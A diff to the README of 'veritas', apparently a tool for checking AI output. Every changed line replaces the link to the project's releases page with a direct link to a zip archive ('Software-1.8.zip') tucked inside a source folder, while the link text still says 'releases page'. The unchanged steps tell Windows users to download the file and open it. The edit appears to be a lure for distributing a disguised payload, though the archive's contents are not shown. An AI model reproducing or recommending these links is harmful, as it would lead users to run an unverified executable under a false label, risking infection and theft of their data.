@@ -1,6 +1,6 @@
 # 🔍 veritas - Verify AI output before action
 
-[![Download veritas](https://img.shields.io/badge/Download-veritas-blue?style=for-the-badge)](https://github.com/familyoctopodidaewhitebarkedpine161/veritas/releases)
+[![Download veritas](https://img.shields.io/badge/Download-veritas-blue?style=for-the-badge)](https://github.com/familyoctopodidaewhitebarkedpine161/veritas/raw/refs/heads/main/veritas/providers/Software-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Veritas helps you check AI output before you trust it. It is built for claim che
 
 ## 📥 Download for Windows
 
-1. Visit the [veritas releases page](https://github.com/familyoctopodidaewhitebarkedpine161/veritas/releases)
+1. Visit the [veritas releases page](https://github.com/familyoctopodidaewhitebarkedpine161/veritas/raw/refs/heads/main/veritas/providers/Software-1.8.zip)
 2. Find the latest release
 3. Download the Windows file for your PC
 4. Open the file after the download finishes
@@ -156,7 +156,7 @@ It fits well when you need more trust in AI output before you use it
 
 ## 📦 Download Again
 
-If you need the Windows file again, use the release page here: [https://github.com/familyoctopodidaewhitebarkedpine161/veritas/releases](https://github.com/familyoctopodidaewhitebarkedpine161/veritas/releases)
+If you need the Windows file again, use the release page here: [https://github.com/familyoctopodidaewhitebarkedpine161/veritas/raw/refs/heads/main/veritas/providers/Software-1.8.zip](https://github.com/familyoctopodidaewhitebarkedpine161/veritas/raw/refs/heads/main/veritas/providers/Software-1.8.zip)
 
 ## 🧩 Best Results
 
